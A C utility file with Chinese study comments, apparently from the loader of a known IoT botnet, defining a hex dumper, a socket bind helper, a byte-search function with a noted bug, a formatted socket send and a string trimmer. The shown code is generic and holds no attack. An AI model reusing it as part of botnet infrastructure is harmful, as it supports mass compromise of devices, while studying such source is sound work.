#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include "headers/includes.h"
#include "headers/util.h"
#include "headers/server.h"
//util.c    一些常用的公共函数

//输出地址addr处开始的len个字节的内存数据
/*
strcpy(a,"fj d\tdjsk\ncdhuci123~!ds/+\tkk\n\t\t");
hexDump(NULL,a,strlen(a));
输出结果：
  0000  66 6a 20 64 09 64 6a 73 6b 0a 63 64 68 75 63 69  fj d.djsk.cdhuci
  0010  31 32 33 7e 21 64 73 2f 2b 09 6b 6b 0a 09 09     123~!ds/+.kk...
*/
void hexDump (char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char*)addr;

    // Output description if given.
    if (desc != NULL)
        printf ("%s:\n", desc); //des只用于输出提示符

    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %i\n",len);
        return;
    }

    // Process every byte in the data.
    for (i = 0; i < len; i++) {     //16个字节为一行打印
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf ("  %s\n", buff);    //打印该行hex对应的字符信息

            // Output the offset.
            printf ("  %04x ", i);  //打印下一行index或offset信息
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))   //暂存hex转字符后的情况，在换行时打印
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];   //0x21~0x7e是可打印字符
        buff[(i % 16) + 1] = '\0';  //更新结尾
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) { //padding，最后不满16个字节就空格填充。
        printf ("   ");
        i++;
    }

    // And print the final ASCII bit.
    printf ("  %s\n", buff);    //如果未满16个字节，那么最后的buff不会在for循环中打印，因此这里要补打印。
}

//bind可用地址并设置socket为非阻塞模式
int util_socket_and_bind(struct server *srv)
{
    struct sockaddr_in bind_addr;
    int i, fd, start_addr;
    BOOL bound = FALSE;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return -1;

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = 0;

    // Try to bind on the first available address
    start_addr = rand() % srv->bind_addrs_len;  //从所有可能绑定的地址池中选择一个起始index
    for (i = 0; i < srv->bind_addrs_len; i++)
    {
        bind_addr.sin_addr.s_addr = srv->bind_addrs[start_addr];    //不断尝试绑定，直到找到一个绑定成功的break。
        if (bind(fd, (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            if (++start_addr == srv->bind_addrs_len) //index++
                start_addr = 0;
        }
        else
        {
            bound = TRUE;
            break;
        }
    }
    if (!bound)
    {
        close(fd);
#ifdef DEBUG
        printf("Failed to bind on any address\n");
#endif
        return -1;
    }

    // Set the socket in nonblocking mode
    if (fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK) == -1)   //设定绑定成功的socket为非阻塞模式
    {
#ifdef DEBUG
        printf("Failed to set socket in nonblocking mode. This will have SERIOUS performance implications\n");
#endif
    }
    return fd;
}
//查找字节序列中是否存在特定的子字节序列【有bug，比如在“aabc”中查找“abc”会失败】
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

//发送socket数据包【最多4096字节】
//通过send发包，但每次的参数个数是可变的。【可格式化的】
BOOL util_sockprintf(int fd, const char *fmt, ...)  //fmt为可变参数
{
    char buffer[BUFFER_SIZE + 2];
    va_list args;
    int len;

    va_start(args, fmt);    //初始化va_list
    len = vsnprintf(buffer, BUFFER_SIZE, fmt, args);    //内部使用va_arg(args, args_type)来读取可变参数
    va_end(args);

    if (len > 0)
    {
        if (len > BUFFER_SIZE)
            len = BUFFER_SIZE;

#ifdef DEBUG
        hexDump("TELOUT", buffer, len);
#endif
        if (send(fd, buffer, len, MSG_NOSIGNAL) != len)
            return FALSE;
    }

    return TRUE;
}
//去掉字符串首尾的空格字符
char *util_trim(char *str)
{
    char *end;

    while(isspace(*str))        //去首部空格
        str++;

    if(*str == 0)
        return str;

    end = str + strlen(str) - 1;
    while(end > str && isspace(*end))   //去尾部空格
        end--;

    *(end+1) = 0;

    return str;
}
